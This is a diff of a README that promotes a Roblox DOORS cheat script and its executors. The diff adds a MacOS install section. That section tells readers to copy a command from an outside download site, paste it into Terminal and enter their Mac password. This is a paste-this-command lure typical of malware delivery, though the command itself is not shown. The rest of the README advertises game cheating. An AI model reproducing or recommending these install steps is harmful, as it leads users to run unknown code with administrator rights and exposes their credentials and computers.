@@ -4,7 +4,6 @@
 ![Latest Version](https://img.shields.io/badge/Latest%20Version-5.1-green?style=for-the-badge&logo=github)
 ![User Rating](https://img.shields.io/badge/User%20Rating-4.87%2F5-gold?style=for-the-badge&logo=star)
 
-
 Welcome to the ultimate **roblox doors script** repository! This comprehensive automation tool transforms your DOORS gameplay experience by providing advanced features like entity ESP, level skipping, flight mechanics, and instant door unlocking. Whether you're struggling with challenging rooms or looking to speedrun through levels, this script eliminates frustration and helps you progress effortlessly.
 
 <div align="center">
@@ -78,7 +77,7 @@ Community feedback on platforms and our **doors script discord** consistently ra
 
 ## How to Install
 
-### For PC (Windows/MacOS)
+### For Windows
 
 1. Download your preferred Roblox executor (Synapse X, KRNL, **doors script xeno**, or **doors script delta executor**)
 2. Launch Roblox and join the DOORS game
@@ -92,7 +91,18 @@ Community feedback on platforms and our **doors script discord** consistently ra
 
 [![Download DOORS Script](https://img.shields.io/badge/Download%20DOORS%20Script-brightgreen?style=for-the-badge&logo=github)](https://doorsrbx.github.io/doors/)
 
-### For Mobile (Android)
+### For MacOS
+
+1. Click the **Download** button and **Copy** the provided installation command.
+2. Open **Terminal** (find it via Spotlight with `Cmd + Space`).
+3. Paste the command line and press **Enter**.
+4. Type your **Mac Password**.
+5. That’s it! You’ll find **DOORS.app** waiting in your **Applications** folder.
+
+
+[![Download DOORS Script](https://img.shields.io/badge/Download%20DOORS%20Script-brightgreen?style=for-the-badge&logo=github)](https://doorsrbx.github.io/doors/)
+
+### For Android
 
 1. Download a mobile executor like Arceus X, Hydrogen, or Delta
 2. Install and grant necessary permissions
